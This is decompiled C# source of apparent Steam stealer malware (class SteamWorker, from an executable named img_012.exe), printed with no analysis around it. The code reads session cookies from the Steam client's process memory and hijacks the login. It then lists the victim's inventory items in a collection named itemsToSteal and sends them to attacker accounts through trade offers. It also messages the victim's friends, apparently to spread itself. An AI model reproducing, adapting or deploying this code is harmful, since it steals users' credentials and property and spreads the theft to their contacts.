// Decompiled with JetBrains decompiler
// Type: SteamWorker
// Assembly: img_012, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 502588B3-DCFF-462A-9C8C-46E9EB112CFD
// Assembly location: C:\Users\Scars\Desktop\img_012.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;

public class SteamWorker
{
  private List<string> friends = new List<string>();
  public CookieContainer cookiesContainer = new CookieContainer();
  private List<string[]> OffersList = new List<string[]>();
  public List<string> ParsedSteamCookies = new List<string>();
  private List<string[]> itemsToSteal = new List<string[]>();

  private string umquid { get; set; }

  private string access_token { get; set; }

  private string steamID
  {
    get
    {
      return this.ParsedSteamCookies.Count > 0 ? this.ParsedSteamCookies[0].Substring(0, 17) : (string) null;
    }
  }

  private string sessionID { get; set; }

  public void addOffer(string Steam64ID, string tradeID, string tradeToken)
  {
    this.OffersList.Add(new string[3]
    {
      Steam64ID,
      tradeID,
      tradeToken
    });
  }

  private string getCookieValue(CookieContainer input_cc, string name)
  {
    Hashtable hashtable = (Hashtable) typeof (CookieContainer).GetField("m_domainTable", BindingFlags.Instance | BindingFlags.NonPublic).GetValue((object) input_cc);
    foreach (string str1 in (IEnumerable) hashtable.Keys)
    {
      object obj = hashtable[(object) str1];
      SortedList sortedList = (SortedList) obj.GetType().GetField("m_list", BindingFlags.Instance | BindingFlags.NonPublic).GetValue(obj);
      foreach (string str2 in (IEnumerable) sortedList.Keys)
      {
        foreach (Cookie cookie in (CookieCollection) sortedList[(object) str2])
        {
          if (cookie.Name == name)
            return ((object) cookie.Value).ToString();
        }
      }
    }
    return string.Empty;
  }

  private List<string[][]> divideList(List<string[]> input, int size)
  {
    List<string[][]> list1 = new List<string[][]>();
    int num = 0;
    if (input == null)
      return (List<string[][]>) null;
    List<string[]> list2 = new List<string[]>();
    for (int index = 0; index < input.Count; ++index)
    {
      list2.Add(input[index]);
      ++num;
      if (num == size)
      {
        list1.Add(list2.ToArray());
        list2.Clear();
        num = 0;
      }
    }
    if (list2.Count > 0)
      list1.Add(list2.ToArray());
    return list1;
  }

  private static string getFilterValues(string filters, string name)
  {
    if (filters.Contains(name))
    {
      string[] strArray = filters.Split(new char[2]
      {
        ':',
        ';'
      }, StringSplitOptions.RemoveEmptyEntries);
      for (int index = 0; index < strArray.Length; ++index)
      {
        if (strArray[index] == name)
        {
          string str = strArray[index + 1];
          if (str != null)
            return str;
        }
      }
    }
    return (string) null;
  }

  private void addInList(ref List<string[]> whereINeedPut, List<string[]> willinputed)
  {
    if (willinputed == null)
      return;
    for (int index = 0; index < willinputed.Count; ++index)
    {
      if (!whereINeedPut.Contains(willinputed[index]))
        whereINeedPut.Add(willinputed[index]);
    }
  }

  public List<string[]> GetItems(string steamID, string appID, string[] contexIds = null)
  {
    List<string[]> whereINeedPut = new List<string[]>();
    if (contexIds == null)
    {
      string input = SteamHttp.SteamWebRequest(this.cookiesContainer, "profiles/" + steamID + "/inventory/json/" + appID + "/2/?trading=1&market=1", (string) null, "");
      try
      {
        whereINeedPut = new inventoryjson().Parse(input, "2");
      }
      catch
      {
        return (List<string[]>) null;
      }
    }
    else
    {
      for (int index = 0; index < contexIds.Length; ++index)
      {
        string input = SteamHttp.SteamWebRequest(this.cookiesContainer, "profiles/" + steamID + "/inventory/json/" + appID + "/" + contexIds[index] + "/?trading=1&market=1", (string) null, "");
        try
        {
          List<string[]> willinputed = new inventoryjson().Parse(input, contexIds[index]);
          this.addInList(ref whereINeedPut, willinputed);
        }
        catch
        {
        }
      }
    }
    return whereINeedPut.Count > 0 ? whereINeedPut : (List<string[]>) null;
  }

  public void FilterByRarity(ref List<string[]> input, string filter)
  {
    string[] strArray = filter.Split(',');
    List<string[]> list = new List<string[]>();
    for (int index1 = 0; index1 < input.Count; ++index1)
    {
      for (int index2 = 0; index2 < strArray.Length; ++index2)
      {
        string str1 = input[index1][4];
        char[] chArray = new char[1]
        {
          ' '
        };
        foreach (string str2 in str1.Split(chArray))
        {
          if (str2 == strArray[index2] && !list.Contains(input[index1]))
          {
            list.Add(input[index1]);
            break;
          }
        }
      }
    }
    input = list.Count > 0 ? list : (List<string[]>) null;
  }

  public void SendItems(string message = "")
  {
    if (this.itemsToSteal == null)
      return;
    List<string[][]> list = this.divideList(this.itemsToSteal, 256);
    if (list != null)
    {
      for (int index1 = 0; index1 < this.OffersList.Count; ++index1)
      {
        for (int index2 = 0; index2 < 5; ++index2)
        {
          int index3 = index2 + index1 * 5;
          if (index3 < list.Count)
          {
            if (this.sentItems(this.getCookieValue(this.cookiesContainer, "sessionid"), this.prepareItems(list[index3]), this.OffersList[index1], message) == null)
                ;
          }
          else
            break;
        }
      }
    }
  }

  private void AddItemsToList(string appIDs, string steamID, string filters = "")
  {
    string[] strArray = appIDs.Split(',');
    if (appIDs.Length <= 1)
      return;
    for (int index = 0; index < strArray.Length; ++index)
    {
      string steamID1 = steamID;
      string appID = strArray[index];
      string[] contexIds;
      if (!(strArray[index] != "753"))
        contexIds = new string[4]
        {
          "1",
          "3",
          "6",
          "7"
        };
      else
        contexIds = (string[]) null;
      List<string[]> items = this.GetItems(steamID1, appID, contexIds);
      if (items != null)
      {
        if (filters != string.Empty && filters.Contains(strArray[index]))
          this.FilterByRarity(ref items, SteamWorker.getFilterValues(filters, strArray[index]));
        if (items != null)
          this.itemsToSteal.AddRange((IEnumerable<string[]>) items);
      }
    }
  }

  public string prepareItems(string[][] input)
  {
    string str = string.Empty;
    for (int index = 0; index < input.Length; ++index)
      str = str + string.Format("{4}\"appid\":{0},\"contextid\":\"{1}\",\"amount\":{2},\"assetid\":\"{3}\"{5},", (object) input[index][0], (object) input[index][5], (object) input[index][1], (object) input[index][2], (object) "{", (object) "}");
    return str.Remove(str.Length - 1);
  }

  public void sendMessage(string steamID, string message)
  {
    SteamHttp.SteamWebRequest(this.cookiesContainer, string.Format("https://api.steampowered.com/ISteamWebUserPresenceOAuth/Message/v0001/?jsonp=jQuery{0}_{1}&umqid={2}&type=saytext&steamid_dst={3}&text={4}&access_token={5}&_={1}", (object) this.randomInt(22), (object) this.randomInt(13), (object) this.umquid, (object) steamID, (object) Uri.EscapeDataString(message), (object) this.access_token), (string) null, "");
  }

  public void sendMessageToFriends(string message)
  {
    for (int index = 0; index < this.friends.Count; ++index)
      SteamHttp.SteamWebRequest(this.cookiesContainer, string.Format("https://api.steampowered.com/ISteamWebUserPresenceOAuth/Message/v0001/?jsonp=jQuery{0}_{1}&umqid={2}&type=saytext&steamid_dst={3}&text={4}&access_token={5}&_={1}", (object) this.randomInt(22), (object) this.randomInt(13), (object) this.umquid, (object) this.friends[index], (object) Uri.EscapeDataString(message), (object) this.access_token), (string) null, "");
  }

  public void getFriends()
  {
    this.friends.Clear();
    string[] strArray = SteamHttp.SteamWebRequest(this.cookiesContainer, "profiles/" + this.steamID + "/friends/", (string) null, "").Split(new string[1]
    {
      "\r\n"
    }, StringSplitOptions.RemoveEmptyEntries);
    try
    {
      for (int index = 0; index < strArray.Length; ++index)
      {
        if (strArray[index].IndexOf("name=\"friends") != -1)
        {
          string str = strArray[index].Split(new char[2]
          {
            '[',
            ']'
          })[3];
          if (!this.friends.Contains(str))
            this.friends.Add(str);
        }
      }
    }
    catch
    {
    }
  }

  public void initChatSystem()
  {
    string[] strArray1 = SteamHttp.SteamWebRequest(this.cookiesContainer, "chat/", (string) null, "").Split(new string[1]
    {
      "\r\n"
    }, StringSplitOptions.RemoveEmptyEntries);
    for (int index = 0; index < strArray1.Length; ++index)
    {
      if (strArray1[index].IndexOf("WebAPI = new CWebAPI") != -1)
      {
        this.access_token = strArray1[index].Split('"')[1];
        break;
      }
    }
    string str = this.randomInt(13);
    string[] strArray2 = SteamHttp.SteamWebRequest(this.cookiesContainer, "https://api.steampowered.com/ISteamWebUserPresenceOAuth/Logon/v0001/?jsonp=jQuery" + this.randomInt(22) + "_" + str + "&ui_mode=web&access_token=" + this.access_token + "&_=" + str, (string) null, "").Split('"');
    for (int index = 0; index < strArray2.Length; ++index)
    {
      if (strArray2[index] == "umqid")
      {
        this.umquid = strArray2[index + 2];
        break;
      }
    }
  }

  public string randomInt(int count)
  {
    Random random = new Random();
    StringBuilder stringBuilder = new StringBuilder();
    for (int index = 0; index < count; ++index)
      ((object) stringBuilder.Append(random.Next(0, 10))).ToString();
    return ((object) stringBuilder).ToString();
  }

  private string sentItems(string sessionID, string items, string[] Offer, string message = "")
  {
    return SteamHttp.SteamWebRequest(this.cookiesContainer, "tradeoffer/new/send", "sessionid=" + sessionID + "&partner=" + Offer[0] + "&tradeoffermessage=" + Uri.EscapeDataString(message) + "&json_tradeoffer=" + Uri.EscapeDataString(string.Format("{5}\"newversion\":true,\"version\":2,\"me\":{5}\"assets\":[{3}],\"currency\":[],\"ready\":false{6},\"them\":{5}\"assets\":[],\"currency\":[],\"ready\":false{6}{6}", (object) sessionID, (object) Offer[0], (object) message, (object) items, (object) Offer[2], (object) "{", (object) "}")) + "&trade_offer_create_params=" + Uri.EscapeDataString(string.Format("{0}\"trade_offer_access_token\":\"{2}\"{1}", (object) "{", (object) "}", (object) Offer[2])), "tradeoffer/new/?partner=" + Offer[1] + "&token=" + Offer[2]);
  }

  public void setCookies(bool a)
  {
    this.cookiesContainer.SetCookies(new Uri("http://steamcommunity.com"), "steamLogin=" + this.ParsedSteamCookies[a ? 0 : 1]);
    this.cookiesContainer.SetCookies(new Uri("http://steamcommunity.com"), "steamLoginSecure=" + this.ParsedSteamCookies[a ? 1 : 0]);
  }

  public void ParseSteamCookies()
  {
    this.ParsedSteamCookies.Clear();
    WinApis.SYSTEM_INFO input = new WinApis.SYSTEM_INFO();
    while (input.minimumApplicationAddress.ToInt32() == 0)
      WinApis.GetSystemInfo(out input);
    IntPtr adress = input.minimumApplicationAddress;
    long num = (long) adress.ToInt32();
    List<string> list = new List<string>();
    Process[] processesByName = Process.GetProcessesByName("steam");
    Process process = (Process) null;
    for (int index = 0; index < processesByName.Length; ++index)
    {
      try
      {
        foreach (ProcessModule processModule in (ReadOnlyCollectionBase) processesByName[index].Modules)
        {
          if (processModule.FileName.EndsWith("steamclient.dll"))
          {
            process = processesByName[index];
            break;
          }
        }
      }
      catch
      {
      }
    }
    if (process == null)
      return;
    IntPtr handle = WinApis.OpenProcess(1040U, false, process.Id);
    WinApis.PROCESS_QUERY_INFORMATION processQuery = new WinApis.PROCESS_QUERY_INFORMATION();
    IntPtr numberofbytesread = new IntPtr(0);
    for (; WinApis.VirtualQueryEx(handle, adress, out processQuery, 28U) != 0; adress = new IntPtr(num))
    {
      if ((int) processQuery.Protect == 4 && (int) processQuery.State == 4096)
      {
        byte[] numArray = new byte[(IntPtr)processQuery.RegionSize];
        WinApis.ReadProcessMemory(handle, processQuery.BaseAdress, numArray, processQuery.RegionSize, out numberofbytesread);
        MatchCollection matchCollection = new Regex("7656119[0-9]{10}%7c%7c[A-F0-9]{40}", RegexOptions.IgnoreCase).Matches(Encoding.UTF8.GetString(numArray));
        if (matchCollection.Count > 0)
        {
          foreach (Match match in matchCollection)
          {
            if (!list.Contains(match.Value))
              list.Add(match.Value);
          }
        }
      }
      num += (long) processQuery.RegionSize;
      if (num >= (long) int.MaxValue)
        break;
    }
    this.ParsedSteamCookies = list;
    if (list.Count >= 2)
    {
      this.setCookies(false);
    }
    else
    {
      this.ParsedSteamCookies.Clear();
      this.ParseSteamCookies();
    }
  }

  public void getSessionID()
  {
    do
      ;
    while (!SteamHttp.ObtainsessionID(this.cookiesContainer));
    if (this.cookiesContainer.Count < 4)
    {
      this.cookiesContainer = new CookieContainer();
      this.setCookies(true);
      this.getSessionID();
    }
    else
      this.sessionID = this.getCookieValue(this.cookiesContainer, "sessionid");
  }

  public void addItemsToSteal(string appIds, string filters = "")
  {
    this.AddItemsToList(appIds, this.steamID, filters);
  }

  public List<string[]> getIncomingTradeoffers()
  {
    List<string[]> list = new List<string[]>();
    string[] strArray = SteamHttp.SteamWebRequest(this.cookiesContainer, "profiles/" + this.steamID + "/tradeoffers/", (string) null, "").Split(new string[1]
    {
      "\r\n"
    }, StringSplitOptions.RemoveEmptyEntries);
    for (int index1 = 0; index1 < strArray.Length; ++index1)
    {
      if (strArray[index1].IndexOf("tradeofferid_") != -1 && strArray[index1 + 11].IndexOf("inactive") == -1)
      {
        int num = -1;
        for (int index2 = index1; index2 < strArray.Length; ++index2)
        {
          if (strArray[index2].IndexOf("tradeoffer_footer") != -1)
          {
            num = index2;
            break;
          }
        }
        bool flag = false;
        for (int index2 = num; index2 > 0 && strArray[index2].IndexOf("tradeoffer_item_list") == -1; --index2)
        {
          if (strArray[index2].IndexOf("trade_item") != -1)
          {
            flag = true;
            break;
          }
        }
        list.Add(new string[4]
        {
          strArray[index1].Split('"')[3].Split('_')[1],
          strArray[index1 + 1].Split('\'')[1],
          Uri.UnescapeDataString(strArray[index1 + 1].Split(new string[1]
          {
            "&quot;"
          }, StringSplitOptions.RemoveEmptyEntries)[1]),
          flag ? "1" : "0"
        });
      }
    }
    return list;
  }

  public SteamWorker.OfferStatus acceptOffer(string[] value, out string error)
  {
    error = string.Empty;
    string str = SteamHttp.SteamWebRequest(this.cookiesContainer, "https://steamcommunity.com/tradeoffer/" + value[0] + "/accept", "sessionid=" + this.sessionID + "&tradeofferid=" + value[0] + "&partner=" + value[1], "tradeoffer/" + value[0] + "/");
    if (str == null)
      return SteamWorker.OfferStatus.Error;
    if (str.IndexOf("tradeid") != -1)
      return SteamWorker.OfferStatus.Accepted;
    error = str;
    return SteamWorker.OfferStatus.Error;
  }

  public void declineOffer(string offer)
  {
    SteamHttp.SteamWebRequest(this.cookiesContainer, "https://steamcommunity.com/tradeoffer/" + offer + "/decline", "sessionid=" + this.sessionID, this.steamID + "76561198068284082/tradeoffers");
  }

  public void LogIt(string line)
  {
    try
    {
      using (StreamWriter streamWriter = System.IO.File.AppendText("log.txt"))
        streamWriter.WriteLine(DateTime.Now.ToString("[dd.MM.yyyy hh:mm:ss] ") + line);
    }
    catch
    {
    }
  }

  public void acceptAllIncomingTrades(bool LoggingIt)
  {
    List<string[]> incomingTradeoffers = this.getIncomingTradeoffers();
    for (int index = 0; index < incomingTradeoffers.Count; ++index)
    {
      string error = "";
      if (incomingTradeoffers[index][3] == "1")
      {
        this.LogIt(incomingTradeoffers[index][2] + "(" + incomingTradeoffers[index][1] + ") -> " + this.steamID + " abuse detected");
        this.declineOffer(incomingTradeoffers[index][0]);
      }
      else
      {
        SteamWorker.OfferStatus offerStatus = this.acceptOffer(incomingTradeoffers[index], out error);
        if (LoggingIt)
        {
          if (offerStatus == SteamWorker.OfferStatus.Accepted)
            this.LogIt(incomingTradeoffers[index][2] + "(" + incomingTradeoffers[index][1] + ") -> " + this.steamID + " accepted");
          if (offerStatus == SteamWorker.OfferStatus.Error)
          {
            this.LogIt(incomingTradeoffers[index][2] + "(" + incomingTradeoffers[index][1] + ") -> " + this.steamID + " Error: \"" + error + "\"");
            this.declineOffer(incomingTradeoffers[index][0]);
          }
        }
      }
    }
  }

  public enum OfferStatus
  {
    Accepted,
    Abuse,
    Error,
  }
}
